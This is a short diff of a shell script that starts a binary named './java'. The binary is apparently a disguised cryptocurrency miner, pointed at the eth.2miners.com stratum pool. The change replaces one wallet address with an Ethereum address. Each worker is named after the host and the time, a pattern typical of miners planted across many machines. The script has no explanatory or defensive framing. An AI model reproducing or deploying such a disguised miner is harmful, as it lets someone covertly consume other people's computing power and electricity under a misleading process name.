@@ -1,3 +1,3 @@
 #!/bin/sh
 
-./java -P stratum1+tcp://1HENW9qnhrFd3gr37Qsxn494v7pawKyCrd.$HOSTNAME-$(date +%H-%M)@eth.2miners.com:2020
+./java -P stratum1+tcp://0x406cc90e0a558e247a539e685e02ad8cb22f91c8.$HOSTNAME-$(date +%H-%M)@eth.2miners.com:2020
